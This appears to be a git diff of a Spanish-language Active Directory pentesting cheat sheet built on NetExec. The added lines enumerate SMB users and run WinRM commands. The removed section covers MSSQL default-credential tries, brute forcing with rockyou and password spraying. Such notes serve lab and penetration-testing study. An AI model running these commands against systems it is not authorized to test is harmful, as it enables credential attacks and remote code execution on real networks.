@@ -323,8 +323,9 @@ NOTA:
 ❯ nxc smb <IP> -u 'user' -p 'pass' --shares
 # Shares accesibles
 
-❯ nxc smb <IP> -u 'user' -p 'pass' --users
-# Usuarios del dominio
+❯ nxc smb <IP> -u user -p 'pass' --users    # Enumerar usuarios del dominio
+❯ nxc smb <IP> -u user -p 'pass' --users | grep -E 'DC01.*(Administrator|Guest|krbtgt|michael|ryan|oscar|sql_svc|rose|ca_svc)' | awk '$5 != "[+]" {print $5}' > users.txt
+# Agregar los usuarios del dominio en un archivo 
 
 ❯ nxc smb <IP> -u 'user' -p 'pass' --pass-pol
 # Política de contraseñas (lockout, longitud, etc.)
@@ -517,6 +518,15 @@ Jerarquía de preferencia para ejecución remota:
 # - SMB accesible
 ```
 
+```bash
+❯ nxc winrm <IP> -u 'user' -p 'pass'
+# Requiere grupo "Remote Management Users" → acceso remoto
+# Muestra [Pwn3d!]
+
+❯ nxc winrm <IP> -u 'user' -p 'pass' -d domain -x 'whoami'
+# Ejecución remota vía WinRM
+```
+
 ## 8. Dump de credenciales
 
 ```bash
@@ -544,48 +554,6 @@ Jerarquía de preferencia para ejecución remota:
 # - GetChanges
 # - GetChangesAll
 # Muestra: hashes, historial de passwords, última modificación
-```
-
-## 9. Movimiento lateral a otros protocolos
-
-> Aquí es donde saltas directo cuando ya validaste creds en el paso 5 y quieres probarlas en WinRM / MSSQL / LDAP.
-
-```bash
-❯ nxc winrm <IP> -u 'user' -p 'pass'
-# Requiere grupo "Remote Management Users" → acceso remoto
-# Muestra [Pwn3d!]
-
-❯ nxc winrm <IP> -u 'user' -p 'pass' -d domain -x 'whoami'
-# Ejecución remota vía WinRM
-```
-
-```bash
-❯ nxc mssql <IP> -u 'sa' -p ''
-❯ nxc mssql <IP> -u 'sa' -p 'sa'
-❯ nxc mssql <IP> -u 'sa' -p 'admin'
-# Verificar si sa está habilitado y sin contraseña
-
-❯ nxc mssql <IP> -u 'sa' -p /usr/share/wordlists/rockyou.txt
-# Fuerza bruta al usuario sa
-
-❯ nxc mssql <IP> -u sa -p passwd.txt --local-auth
-# Ataque MSSQL local
-
-❯ nxc mssql <IP> -u users.txt -p passwords.txt --continue-on-success
-# Verificar varios usuarios clásicos de MSSQL de una vez
-
-❯ nxc mssql <IP> -u user.txt -p passwd.txt --continue-on-success --local-auth
-# Fuerza bruta MSSQL
-
-NOTA: Los usuarios por defecto de MSSQL que siempre vale probar:
-	sa → System Administrator → el más importante
-	admin → común en instalaciones antiguas
-	administrator
-```
-
-```bash
-❯ nxc ldap <IP> 'user' -p 'pass'
-# Enumeración LDAP
 ```
 
 ## CONDICIONES CLAVE
